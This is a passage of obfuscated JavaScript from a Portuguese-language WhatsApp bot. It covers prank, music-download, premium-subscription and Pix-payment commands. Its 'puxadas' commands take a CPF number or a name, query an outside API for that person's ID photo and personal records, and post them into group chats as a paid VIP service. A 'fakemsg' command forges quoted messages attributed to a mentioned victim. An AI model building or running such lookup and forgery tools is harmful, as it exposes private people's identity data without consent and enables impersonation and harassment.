                const _0x4815d2 = _0x302296.message.extendedTextMessage.contextInfo;
                const _0x338592 = _0x2b2cd0 && _0x2b2cd0.length > 0 ? _0x2b2cd0[0] : _0x4815d2 && _0x4815d2.participant;
                const _0x522f07 = "\n┏ @" + (_0x338592 ? _0x338592.split("@")[0] : "") + "\n*Pague o boleto no valor de* *R$" + Math.floor(Math.random() * 9999) + "*     \n🍼 B O L E T O 🍼\n█║▌│║▌║▌│█│▌║│█│\n¹²³ ³² ²³¹ ¹ ¹²³² ³²¹ ³²³ ¹²³ \n";
                if (!_0x338592 || !_0x302296) {
                  return _0x403602("Mencione alguém ou responda a uma mensagem para pagar o boleto.");
                }
                if (_0x2dd81a.includes(_0x338592) || _0x27033e.includes(_0x338592)) {
                  return _0x403602("eu ou meu dono nao o mongol kkkkk.");
                }
                try {
                  _0x196616 = await _0x263319.profilePictureUrl(_0x338592.split("@")[0] + "@c.us", "image");
                } catch {
                  _0x196616 = "https://telegra.ph/file/b5427ea4b8701bc47e751.jpg";
                }
                _0x263319.sendMessage(_0x4f1071, {
                  text: _0x522f07,
                  contextInfo: {
                    externalAdReply: {
                      title: "🧾 PAGUE O BOLETO 🧾",
                      thumbnail: await getBuffer(_0x196616),
                      mediaType: 1,
                      showAdAttribution: true,
                      sourceUrl: "http://" + NickDono + ".com"
                    }
                  },
                  quoted: _0x302296
                });
              } catch (_0x3aeabe) {
                console.error("q bct deu erro: ", _0x3aeabe);
                return _0x403602("mzra num que funfar °-°");
              }
              break;
            case "totalcmd":
            case "totalcomando":
              {
                fs.readFile("./index.js", "utf8", (_0x29013e, _0x1f0c7d) => {
                  if (_0x29013e) {
                    throw _0x29013e;
                  }
                  let _0x495d28 = /case\s'(\w+)'/g;
                  let _0x356fd5;
                  let _0x4d8d22 = [];
                  while ((_0x356fd5 = _0x495d28.exec(_0x1f0c7d)) !== null) {
                    _0x4d8d22.push(_0x356fd5[1]);
                  }
                  let _0x1817d3 = "" + _0x4d8d22.join("\n• ");
                  let _0x23fbac = _0x4d8d22.length;
                  _0x403602("Ola " + _0x55a6ac + " atualmente eu tenho um total de: " + _0x23fbac + " comandos.");
                });
              }
              break;
            case "playdoc":
              if (!_0x1d6557) {
                return _0x403602("Onde está o nome? Exemplo:\n\n" + (_0x1d93be + _0x3dec88) + " nome ou link");
              }
              try {
                const _0x394b27 = {
                  text: "⏳",
                  key: _0x302296.key
                };
                const _0x1b57d6 = {
                  react: _0x394b27
                };
                _0x3445cf = await _0x263319.sendMessage(_0x4f1071, _0x1b57d6);
                _0x403602(enviar.espere);
                const _0x23eb56 = await fetchJson(SITE_JEFF_APIS + "/api/ytsrc/videos?q=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                if (_0x23eb56.resultado && _0x23eb56.resultado.length > 0) {
                  const _0x930d11 = {
                    text: "✅️",
                    key: _0x302296.key
                  };
                  const _0x17ef47 = {
                    react: _0x930d11
                  };
                  _0x3445cf = await _0x263319.sendMessage(_0x4f1071, _0x17ef47);
                  const _0x35126d = {
                    url: SITE_JEFF_APIS + "/api/dl/ytaudio2?url=" + _0x23eb56.resultado[0].url + "&apikey=" + _0x512d5e
                  };
                  const _0x5aaa05 = {
                    document: _0x35126d,
                    mimetype: "audio/mpeg",
                    fileName: "" + _0x23eb56.resultado[0].title
                  };
                  const _0x16ee90 = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x5aaa05, _0x16ee90);
                } else {
                  return _0x403602("Desculpe por não conseguir encontrar a música. por tavor, forneça mais detalhes sobre ela");
                }
              } catch (_0x5557f5) {
                const _0x5b6b63 = {
                  text: "❌",
                  key: _0x302296.key
                };
                const _0x1f0955 = {
                  react: _0x5b6b63
                };
                _0x3445cf = await _0x263319.sendMessage(_0x4f1071, _0x1f0955);
                return _0x403602("Erro ao processar a solicitação. Tente novamente mais tarde.");
              }
              break;
            case "fotorj":
              if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
              }
              if (!_0xd20756 && !_0x38b1b5) {
                return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
              }
              if (!_0x1d6557) {
                return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "fotorj 12736105710");
              }
              if (!_0x27b8b3) {
                return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
              }
              const _0x15d566 = {
                text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
              };
              const _0x8dc4fb = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x15d566, _0x8dc4fb);
              const _0xa8688f = await fetchJson(SITE_JEFF_APIS + "/consultas/foto?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
              if (!_0xa8688f || !_0xa8688f.resultado || !_0xa8688f.resultado.base64) {
                return _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              pikadojeff = _0xa8688f.resultado.base64;
              bctbuffer = Buffer.from(pikadojeff, "base64");
              const _0x51b9e8 = {
                image: bctbuffer,
                caption: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + _0xa8688f.resultado.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼 " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc
              };
              const _0x4fb54d = {
                quoted: _0xa6b34
              };
              await _0x263319.sendMessage(_0x4f1071, _0x51b9e8, _0x4fb54d);
              break;
            case "fotosp":
              if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
              }
              if (!_0xd20756 && !_0x38b1b5) {
                return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
              }
              if (!_0x1d6557) {
                return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "fotosp 12736105710");
              }
              if (!_0x27b8b3) {
                return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
              }
              const _0x468f76 = {
                text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
              };
              const _0x22161b = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x468f76, _0x22161b);
              base = await fetchJson(SITE_JEFF_APIS + "/consultas/foto-sp?ddos=" + _0x1d6557 + "&apikey=" + _0x512d5e);
              if (!base || !base.resultado || !base.foto) {
                return _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              pikadjeff = base.foto;
              rosadinha = Buffer.from(pikadjeff, "base64");
              const _0x2f0cb0 = {
                image: rosadinha,
                caption: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + base.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼 " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc
              };
              const _0x23a979 = {
                quoted: _0xa6b34
              };
              await _0x263319.sendMessage(_0x4f1071, _0x2f0cb0, _0x23a979);
              break;
            case "fotoma-nome":
              if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
              }
              if (!_0xd20756 && !_0x38b1b5) {
                return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
              }
              if (!_0x1d6557) {
                return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "fotoma-nome joao pedro");
              }
              if (!_0x27b8b3) {
                return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
              }
              const _0x1fc0ca = {
                text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
              };
              const _0x3eefd6 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x1fc0ca, _0x3eefd6);
              base = await fetchJson(SITE_JEFF_APIS + "/consultas/nome/foto-ma?ddos=" + _0x1d6557 + "&apikey=" + _0x512d5e);
              if (!base || !base.resultado || !base.foto) {
                return _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              pikadjeff = base.foto;
              rosadinha = Buffer.from(pikadjeff, "base64");
              const _0x19bb5c = {
                image: rosadinha,
                caption: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + base.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼 " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc
              };
              const _0xc48ef9 = {
                quoted: _0xa6b34
              };
              await _0x263319.sendMessage(_0x4f1071, _0x19bb5c, _0xc48ef9);
              break;
            case "foto-ma":
              if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
              }
              if (!_0xd20756 && !_0x38b1b5) {
                return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
              }
              if (!_0x1d6557) {
                return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "foto-ma 28875915334");
              }
              if (!_0x27b8b3) {
                return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
              }
              const _0x42f25f = {
                text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
              };
              const _0x29c923 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x42f25f, _0x29c923);
              base = await fetchJson(SITE_JEFF_APIS + "/consultas/cpf/foto-ma?ddos=" + _0x1d6557 + "&apikey=" + _0x512d5e);
              if (!base || !base.resultado || !base.foto) {
                return _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              pikadjeff = base.foto;
              rosadinha = Buffer.from(pikadjeff, "base64");
              const _0x43b99a = {
                image: rosadinha,
                caption: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + base.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼 " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc
              };
              const _0x965a1b = {
                quoted: _0xa6b34
              };
              await _0x263319.sendMessage(_0x4f1071, _0x43b99a, _0x965a1b);
              break;
            case "fototo-nome":
              if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
              }
              if (!_0xd20756 && !_0x38b1b5) {
                return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
              }
              if (!_0x1d6557) {
                return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "fototo-nome joao pedro");
              }
              if (!_0x27b8b3) {
                return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
              }
              const _0x1ed35a = {
                text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
              };
              const _0x44bf65 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x1ed35a, _0x44bf65);
              base = await fetchJson(SITE_JEFF_APIS + "/consultas/nome/foto-to?ddos=" + _0x1d6557 + "&apikey=" + _0x512d5e);
              if (!base || !base.resultado || !base.foto) {
                return _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              pikadjeff = base.foto;
              rosadinha = Buffer.from(pikadjeff, "base64");
              const _0x325242 = {
                image: rosadinha,
                caption: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + base.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼 " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc
              };
              const _0x1ed193 = {
                quoted: _0xa6b34
              };
              await _0x263319.sendMessage(_0x4f1071, _0x325242, _0x1ed193);
              break;
            case "foto-to":
              if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
              }
              if (!_0xd20756 && !_0x38b1b5) {
                return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
              }
              if (!_0x1d6557) {
                return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "foto-to 11530802148");
              }
              if (!_0x27b8b3) {
                return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
              }
              const _0x5d3903 = {
                text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
              };
              const _0x5ea414 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x5d3903, _0x5ea414);
              base = await fetchJson(SITE_JEFF_APIS + "/consultas/cpf/foto-to?ddos=" + _0x1d6557 + "&apikey=" + _0x512d5e);
              if (!base || !base.resultado || !base.foto) {
                return _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              pikadjeff = base.foto;
              rosadinha = Buffer.from(pikadjeff, "base64");
              const _0x801d05 = {
                image: rosadinha,
                caption: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + base.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼 " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc
              };
              const _0x88ebe1 = {
                quoted: _0xa6b34
              };
              await _0x263319.sendMessage(_0x4f1071, _0x801d05, _0x88ebe1);
              break;
            case "fakechat":
            case "fakemsg":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              var [_0x4d5172, _0x9ef8b, _0x138e71] = _0x1d6557.split("/");
              var _0x265ccd = _0x302296.message.extendedTextMessage && _0x302296.message.extendedTextMessage.contextInfo && _0x302296.message.extendedTextMessage.contextInfo.mentionedJid ? _0x302296.message.extendedTextMessage.contextInfo.mentionedJid[0] : null;
              if (_0x265ccd && _0x9ef8b && _0x138e71) {
                const _0x2770aa = {
                  text: _0x138e71
                };
                const _0x1c55d9 = {
                  fromMe: false,
                  participant: _0x265ccd
                };
                const _0x5d6fc3 = {
                  conversation: _0x9ef8b
                };
                const _0x326a0d = {
                  key: _0x1c55d9,
                  message: _0x5d6fc3
                };
                const _0x9e59f = {
                  quoted: _0x326a0d
                };
                _0x263319.sendMessage(_0x4f1071, _0x2770aa, _0x9e59f);
              } else {
                _0x403602("Crie mensagens fakes com qualquer uma pessoa! Explicando abaixo:\n—\n• Você precisaria mencionar a pessoa e adicionar a mensagem que ele supostamente iria enviar e que você responderia a seguinte mensagem, todos usando a *|* para separar o que foi pedido dito nesse textinho...\n• *Ex:* " + (_0x1d93be + _0x3dec88) + " @vitima/msg1/msg2");
              }
              break;
            case "desbanir":
            case "desban":
              try {
                if (!_0xd20756 && !_0x2a5ff3) {
                  return _0x403602("Só usuário premium pode utilizar este comando..");
                }
                if (!_0xf87dd3.includes("/")) {
                  return _0x403602("Exemplo: " + _0x1d93be + "desbanir Número banido injustamente/Meu número +55 81 xxx-xxxx foi banido injustamente desbana por favor");
                }
                var [_0x221869, _0x5cc145] = _0x1d6557.split("/");
                await fetchJson("https://api.bronxyshost.com.br/api/EnviarEmail?titulo=" + _0x221869 + "&texto=" + _0x5cc145 + "&apikey=" + _0x44a335);
                _0x403602("Olá : " + _0x55a6ac + " A mensagem foi enviada para o suporte com sucesso BB...");
              } catch (_0x712e47) {
                if (JSON.stringify(_0x712e47).includes(_0x44a335)) {
                  return console.log("A api caiu ou não foi possivel executar esta ação., espere retornar");
                } else {
                  _0x403602("ERROR!!");
                }
              }
              break;
            case "addpremium":
            case "addvip":
              {
                if (!_0x2a5ff3) {
                  return _0x403602("só meu papai 😤");
                }
                mentioned = _0x302296.message.extendedTextMessage.contextInfo.mentionedJid || _0x40e45c[1] || _0x1dcf0a || _0x25b5fb;
                if (_0x40e45c.length < 2 || _0x40e45c[0] !== "semanal" && _0x40e45c[0] !== "diario" && _0x40e45c[0] !== "permanente" && _0x40e45c[0] !== "mensal") {
                  return _0x403602("Utilize o comando da seguinte forma\ndiario semanal mensal permanente\nEx: " + (_0x1d93be + _0x3dec88) + " diario @.");
                }
                const _0x44c1fd = _0x40e45c[0];
                var _0xc06b5a = "" + mentioned[0].split("@")[0];
                var _0x2f8fb7 = premium.find(_0x589026 => _0x589026.id === _0xc06b5a);
                if (_0x2f8fb7) {
                  if (_0x2f8fb7.tipo === "semanal" && _0x44c1fd === "semanal") {
                    return _0x403602("O usuário já usou o premium semanal e não pode usá-lo novamente.");
                  } else if (_0x2f8fb7.tipo === "permanente" && _0x44c1fd === "permanente") {
                    return _0x403602("O usuário já é um usuário premium permanente.");
                  } else if (_0x2f8fb7.tipo === "mensal" && _0x44c1fd === "mensal") {
                    return _0x403602("O usuário já é um usuário premium mensal.");
                  } else if (_0x2f8fb7.tipo === "diario" && _0x44c1fd === "diario") {
                    return _0x403602("O usuário já é um usuário premium diario.");
                  }
                }
                const _0x322d45 = {
                  id: _0xc06b5a,
                  tipo: _0x44c1fd
                };
                var _0x8dd22 = _0x322d45;
                if (_0x44c1fd === "semanal") {
                  const _0x47ed6b = moment.tz("America/Sao_Paulo").add(1, "week");
                  _0x8dd22.dataExpiracao = _0x47ed6b.format("DD/MM [ás] HH:mm");
                } else if (_0x44c1fd === "mensal") {
                  const _0x4ae68c = moment.tz("America/Sao_Paulo").add(1, "month");
                  _0x8dd22.dataExpiracao = _0x4ae68c.format("DD/MM [ás] HH:mm");
                } else if (_0x44c1fd === "diario") {
                  const _0x4b9163 = moment.tz("America/Sao_Paulo").add(24, "hours");
                  _0x8dd22.dataExpiracao = _0x4b9163.format("DD/MM [ás] HH:mm");
                }
                premium.push(_0x8dd22);
                fs.writeFileSync("./DADOS/premium.json", JSON.stringify(premium, null, 2));
                const _0x5d491a = "./DADOS/" + _0xc06b5a + ".json";
                fs.writeFileSync(_0x5d491a, JSON.stringify(_0x8dd22, null, 2));
                const _0x45c015 = {
                  text: "👑 Usuário " + _0xc06b5a + " foi adicionado à lista de usuários premium como " + _0x44c1fd + " com sucesso👑"
                };
                const _0xe7b29b = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x45c015, _0xe7b29b);
                const _0x211c6c = "Eai " + _0xc06b5a + ", brigado por adquirir o premium " + _0x44c1fd + ".! para mais informações use\n" + _0x1d93be + "infovip";
                const _0x267399 = {
                  text: _0x211c6c
                };
                _0x263319.sendMessage(_0xc06b5a + "@s.whatsapp.net", _0x267399);
              }
              break;
            case "delpremium":
            case "delvip":
              if (!_0x2a5ff3) {
                return _0x403602("só meu papai 😤");
              }
              mentioned = _0x302296.message.extendedTextMessage.contextInfo.mentionedJid;
              {
                const _0x4b2430 = "" + mentioned[0].split("@")[0];
                const _0x114b2f = premium.findIndex(_0xdd1138 => _0xdd1138.id === _0x4b2430);
                if (_0x114b2f !== -1) {
                  premium.splice(_0x114b2f, 1);
                  fs.writeFileSync("./DADOS/premium.json", JSON.stringify(premium, null, 2));
                  if (fs.existsSync(_0x1ed4d5)) {
                    fs.unlinkSync(_0x1ed4d5);
                  }
                  const _0x35fc73 = {
                    text: "❌Usuário " + _0x4b2430 + " foi removido da lista de usuários premium com sucesso e seu arquivo foi excluído❌"
                  };
                  const _0x5296a1 = {
                    quoted: _0x302296
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x35fc73, _0x5296a1);
                } else {
                  return _0x403602("O número de telefone especificado não está na lista premium.");
                }
              }
              break;
            case "vip-perma":
            case "vip-permanente":
              {
                if (_0x38b1b5) {
                  return _0x403602("Quer comprar Premium de novo? Espera teu premium acabar, consulte ele em \"" + _0x1d93be + "infovip\"");
                }
                try {
                  let _0x47d800 = await fetch(SITE_JEFF_APIS + "/api/mercadopago_pix?token=" + _0x26d981 + "&valor=" + PreçoProduto8(_0x1d93be, _0x32e455) + "&apikey=" + _0x512d5e);
                  let _0x588bc2 = await _0x47d800.json();
                  if (!_0x588bc2.status) {
                    throw new Error("Failed to generate payment information");
                  }
                  const _0x480dbd = "👤 Destinatário: " + _0x588bc2.destinatario + "\n🏦 Banco: Mercado Pago\n💲 Valor: R$ " + _0x588bc2.valor + ",00\n🌹 Deseja: Vip Permanente.\n\n⚠️ Caso não paguem em até *10 Minutos*, sua compra será cancelada, use " + (_0x1d93be + _0x3dec88) + " novamente.\n💠 Use o *PIX copia e cola* ou o *QR Code* abaixo para completar o depósito.";
                  const _0x14583b = {
                    upload: _0x263319.waUploadToServer
                  };
                  let _0x24e04b = await prepareWAMessageMedia({
                    image: Buffer.from(_0x588bc2.qr_code, "base64")
                  }, _0x14583b);
                  if (botoes_) {
                    const _0x3f77d8 = {
                      hasMediaAttachment: true,
                      imageMessage: _0x24e04b.imageMessage
                    };
                    const _0x34785a = {
                      text: _0x480dbd
                    };
                    _0x263319.relayMessage(_0x4f1071, {
                      interactiveMessage: {
                        header: _0x3f77d8,
                        headerType: "IMAGE",
                        body: _0x34785a,
                        nativeFlowMessage: {
                          buttons: [{
                            name: "cta_copy",
                            buttonParamsJson: JSON.stringify({
                              display_text: "COPIAR CHAVE PIX",
                              id: "sim",
                              copy_code: "" + _0x588bc2.chave
                            })
                          }]
                        }
                      }
                    }, {});
                  } else {
                    const _0x1bb2b2 = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, {
                      image: Buffer.from(_0x588bc2.qr_code, "base64"),
                      caption: _0x480dbd,
                      mentions: [_0x32e455]
                    }, _0x1bb2b2).then(() => _0x403602("" + _0x588bc2.chave));
                  }
                  const _0x3b7e70 = 600000;
                  const _0x1b1b06 = Date.now();
                  let _0x206407;
                  do {
                    let _0x21d662 = await fetch(SITE_JEFF_APIS + "/api/checkpix?token=" + _0x26d981 + "&id=" + _0x588bc2.id + "&apikey=" + _0x512d5e);
                    _0x206407 = await _0x21d662.json();
                    if (_0x206407.status_pagamento === "pending") {
                      await sleep(30000);
                      if (Date.now() - _0x1b1b06 > _0x3b7e70) {
                        throw new Error("Tempo limite excedido. Pagamento não aprovado.");
                      }
                    }
                  } while (_0x206407.status_pagamento === "pending");
                  if (_0x206407.status_pagamento === "approved") {
                    const _0x3256f1 = {
                      id: _0x578612,
                      tipo: "permanente"
                    };
                    var _0xddc781 = _0x3256f1;
                    premium.push(_0xddc781);
                    fs.writeFileSync("./DADOS/premium.json", JSON.stringify(premium, null, 2));
                    fs.writeFileSync(_0x1ed4d5, JSON.stringify(_0xddc781, null, 2));
                    const _0x1a9ea4 = {
                      text: "✅ PAGAMENTO APROVADO ✅\n\n🌹 Adquiriu: Premium Permanente 😍\n\n⌛ Veja mais sobre seu premium em \"" + _0x1d93be + "infovip\"\n\n😊 BOM APROVEITO 😊"
                    };
                    const _0x4ca76e = {
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, _0x1a9ea4, _0x4ca76e);
                  } else {}
                } catch (_0x135e60) {
                  console.log(_0x135e60);
                  return _0x403602("⌛ Pagamento Expirado ⌛\nℹ️ Caso tenha pago, ignore. ℹ️");
                }
              }
              break;
            case "donate":
            case "doacao":
            case "doação":
            case "doar":
            case "apoiar":
              {
                if (!_0x1d6557) {
                  return _0x403602("Quanto você deseja doar?\nObs.: se for centavos, use 0.00.");
                }
                if (_0x1d6557.match(/[a-z]/i)) {
                  return _0x403602("Epa, somente número!!");
                }
                _0x1b86ad(_0x4f1071, "🥺");
                try {
                  let _0x543d53 = await fetch(SITE_JEFF_APIS + "/api/mercadopago_pix?token=" + _0x26d981 + "&valor=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                  let _0x2b321d = await _0x543d53.json();
                  if (!_0x2b321d.status) {
                    throw new Error("Failed to generate payment information");
                  }
                  setTimeout(async () => {
                    _0x263319.sendMessage(_0x4f1071, {
                      image: Buffer.from(_0x2b321d.qr_code, "base64"),
                      caption: "Esse é o Qr-code, caso queira o Pix Copia e Cola, vou te enviar abaixo..."
                    });
                  }, 2000);
                  setTimeout(async () => {
                    _0x263319.sendMessage(_0x4f1071, {
                      text: "*Depósito agendado com sucesso* ✔\n\n💡 Você tem um prazo de *10 minutos* para efetuar o depósito.\n\nUse o *PIX copia e cola* ou o *QR Code* abaixo para completar o depósito."
                    });
                  }, 1000);
                  if (botoes_) {
                    setTimeout(async () => {
                      const _0x1e3ef8 = {
                        text: "" + _0x2b321d.chave
                      };
                      _0x263319.relayMessage(_0x4f1071, {
                        interactiveMessage: {
                          body: _0x1e3ef8,
                          footer: {
                            text: ""
                          },
                          nativeFlowMessage: {
                            buttons: [{
                              name: "cta_copy",
                              buttonParamsJson: JSON.stringify({
                                display_text: "COPIAR",
                                id: "sim",
                                copy_code: "" + _0x2b321d.chave
                              })
                            }]
                          }
                        }
                      }, {});
                    }, 6000);
                  } else {
                    const _0x35994e = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, {
                      image: Buffer.from(_0x2b321d.qr_code, "base64"),
                      caption: "Depósito agendado com sucesso* ✔\n\n💡 Você tem um prazo de *10 minutos* para efetuar o depósito.\n\nUse o *PIX copia e cola* ou o *QR Code* abaixo para completar o depósito.",
                      mentions: [_0x32e455]
                    }, _0x35994e).then(() => _0x403602("" + _0x2b321d.chave));
                  }
                  const _0x2992cb = 600000;
                  const _0x329204 = Date.now();
                  let _0x3adfbe;
                  do {
                    let _0x318a77 = await fetch(SITE_JEFF_APIS + "/api/checkpix?token=" + _0x26d981 + "&id=" + _0x2b321d.id + "&apikey=" + _0x512d5e);
                    _0x3adfbe = await _0x318a77.json();
                    if (_0x3adfbe.status_pagamento === "pending") {
                      await sleep(30000);
                      if (Date.now() - _0x329204 > _0x2992cb) {
                        throw new Error("Tempo limite excedido. Pagamento não aprovado.");
